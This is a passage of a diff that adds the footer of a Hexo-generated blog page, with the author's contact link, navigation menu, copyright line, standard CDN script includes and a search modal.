+                        <li class="list-inline-item">
+                            <a rel="external" href="mailto:naup96721@gmail.com" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="far fa-envelope fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+                </ul>
+                <ul class="copyright footer-menu list-inline">
+                    
+                    
+                        <li class="list-inline-item">
+                            
+                            
+                            <a href="/">
+                                
+                                    Home
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/archives">
+                                
+                                    Archives
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/tags">
+                                
+                                    Tags
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/categories">
+                                
+                                    Categories
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/about">
+                                
+                                    About
+                                
+                            </a>
+                        </li>
+                    
+                </ul>
+                <p class="copyright footer-author">
+                    &copy; -2024 
+                    <a rel="external" class="copyright-link" href="" target="_blank">Naup堇姬</a><br/>
+                    Powered by <a rel="external" class="copyright-link" href="https://hexo.io/" target="_blank">Hexo</a>  
+                    <span class="copyright-split">&nbsp;|&nbsp;&nbsp;</span>
+                    Theme <a rel="external" class="copyright-link" href="https://github.com/luswdev/hexo-theme-clean.git" target="_blank">Clean</a>
+                    
+                    
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+    <!-- After footer scripts -->
+    <!-- jQuery -->
+<script src="//cdn.jsdelivr.net/npm/jquery@2.1.4/dist/jquery.min.js"></script>
+
+<!-- For drop down -->
+<script src="//cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+
+<!-- Bootstrap -->
+<script src="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js"></script>
+<!-- Gallery -->
+<script src="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/js/lightgallery-all.min.js"></script>
+<!-- Busuanzi -->
+
+
+<!-- Search script -->
+
+<script src="/js/search.js"></script>
+
+<script type="text/javascript">
+    $(function () {
+        searchFunc( '/search.xml' , 'searchInput', 'searchResult');
+    });
+</script>
+
+
+
+<script src="/js/main.js"></script>
+
+
+
+    <!-- Search Modal -->
+    <!-- Modal -->
+<div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
+    <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+        <div class="modal-content overflow-auto">
+            <div class="modal-header">
+                <input type="text" class="form-control" placeholder="Searching Keywords..." id="searchInput">
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="modal-body">
+                <div id="searchResult">
+                    <div class="search-empty text-center text-muted p-5">
+                        <i class="far fa-meh"></i>
+                    </div>
+                </div>
+            </div> 
+        </div>
+    </div>
+</div>
+
+
+</body>
+</html>
